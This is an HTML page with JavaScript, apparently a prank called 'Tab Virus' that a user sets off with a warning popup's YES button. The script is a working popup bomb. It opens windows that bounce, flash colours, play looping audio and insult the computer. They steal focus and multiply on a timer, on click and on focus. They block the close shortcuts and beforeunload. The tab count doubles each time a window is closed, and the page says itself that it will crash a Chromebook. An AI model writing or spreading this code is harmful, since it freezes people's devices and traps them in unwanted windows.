<!DOCTYPE html>
<html>
<head>
  <title>Warning: Tab Virus</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #111;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .popup {
      background: #222;
      border: 2px solid red;
      border-radius: 10px;
      padding: 30px;
      max-width: 500px;
      text-align: center;
      box-shadow: 0 0 20px red;
    }
    .popup h2 {
      color: red;
    }
    .popup button {
      margin: 10px;
      padding: 10px 20px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .yes {
      background-color: darkred;
      color: white;
    }
    .no {
      background-color: gray;
      color: white;
    }
  </style>
  <script>
    let tabCount = 5;
    let dramaticTrack;
    const dramaticMusicUrl = "https://www.myinstants.com/media/sounds/epic.mp3";
    const errorSoundUrl = "https://www.myinstants.com/media/sounds/erro.mp3";

    function playDramaticMusic() {
      if (!dramaticTrack) {
        dramaticTrack = new Audio(dramaticMusicUrl);
        dramaticTrack.loop = true;
        dramaticTrack.volume = 0.6;
      }
      dramaticTrack.currentTime = 0;
      dramaticTrack.play().catch(() => {});
    }

    function unleashTabs() {
      playDramaticMusic();
      for (let i = 0; i < tabCount; i++) {
        spawnTab();
      }
    }

    function spawnTab() {
      const insults = [
        "Your CPU needs a retirement plan.",
        "This Chromebook couldn't run Minesweeper.",
        "Is this a potato or a computer?",
        "I’ve seen calculators with more RAM.",
        "Your specs are an insult to silicon.",
        "Fan speed: 9000 RPM. Performance: 0.",
        "This thing lags in Notepad.",
        "Did your Chromebook come with Windows 95?",
        "Your GPU just cried.",
        "Storage: yes. Speed: no."
      ];

      const colors = ["red", "green", "blue", "purple", "yellow", "cyan", "orange"];
      const color = colors[Math.floor(Math.random() * colors.length)];
      const features = `width=360,height=360,left=${Math.random() * screen.availWidth},top=${Math.random() * screen.availHeight}`;
      const win = window.open("", "", features);
      if (!win) return;

      const errorAudio = new Audio(errorSoundUrl);
      errorAudio.volume = 0.6;
      errorAudio.play().catch(() => {});

      const insult = insults[Math.floor(Math.random() * insults.length)];
      const sanitizedInsult = insult
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
      const parentUrl = window.location.href;

      const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>TAB VIRUS ACTIVE</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      font-family: Arial, sans-serif;
      font-size: 20px;
      font-weight: bold;
      color: #fff;
      background: ${color};
    }
    .insult {
      padding: 25px;
      background: rgba(0, 0, 0, 0.7);
      border: 4px solid #ff0000;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(255, 0, 0, 0.8);
      text-shadow: 0 0 10px #000;
    }
  </style>
</head>
<body>
  <div class="insult">${sanitizedInsult}</div>
  <audio src="${dramaticMusicUrl}" autoplay loop></audio>
  <script>
    (function() {
      const colors = ${JSON.stringify(colors)};
      const body = document.body;
      const baseUrl = ${JSON.stringify(parentUrl)};

      function demandMoreTabs(amount) {
        if (window.opener && !window.opener.closed && typeof window.opener.spawnTab === 'function') {
          for (let i = 0; i < amount; i++) {
            window.opener.spawnTab();
          }
        } else {
          for (let i = 0; i < amount; i++) {
            window.open(baseUrl, '_blank');
          }
        }
      }

      setInterval(() => {
        body.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
      }, 250);

      setInterval(() => demandMoreTabs(1 + Math.floor(Math.random() * 2)), 3500);

      window.addEventListener('click', () => demandMoreTabs(3));

      window.addEventListener('focus', () => demandMoreTabs(1));

      window.addEventListener('beforeunload', (event) => {
        demandMoreTabs(5);
        event.preventDefault();
        event.returnValue = 'The tab vortex refuses to close!';
      });

      window.addEventListener('keydown', (event) => {
        if ((event.ctrlKey || event.metaKey) && (event.key.toLowerCase() === 'w' || event.key.toLowerCase() === 'q')) {
          event.preventDefault();
          demandMoreTabs(6);
        }
      });

      setInterval(() => {
        try {
          window.focus();
        } catch (err) {}
      }, 2000);
    })();
  <\/script>
</body>
</html>`;

      win.document.open();
      win.document.write(htmlContent);
      win.document.close();

      let dx = Math.random() > 0.5 ? 12 : -12;
      let dy = Math.random() > 0.5 ? 12 : -12;
      let x = win.screenX;
      let y = win.screenY;

      const bounceInterval = setInterval(() => {
        if (win.closed) {
          clearInterval(bounceInterval);
          tabCount *= 2;
          unleashTabs();
          return;
        }

        x += dx;
        y += dy;

        if (x <= 0 || x + win.outerWidth >= screen.availWidth) {
          dx *= -1;
        }
        if (y <= 0 || y + win.outerHeight >= screen.availHeight) {
          dy *= -1;
        }

        try {
          win.moveTo(x, y);
        } catch (e) {
          clearInterval(bounceInterval);
        }
      }, 45);
    }
  </script>
</head>
<body>
  <div class="popup">
    <h2>🚨 TAB VIRUS WARNING 🚨</h2>
    <p>
      Proceeding will crash your Chromebook with an unrelenting storm of browser tabs.<br>
      Tabs will bounce, flash, insult your specs, and multiply like digital gremlins.<br>
      This is your last chance to turn back.
    </p>
    <button class="yes" onclick="unleashTabs()">YES - Unleash Chaos</button>
    <button class="no" onclick="alert('You have chosen peace... for now.')">NO - I Value My Life</button>
  </div>
</body>
</html>
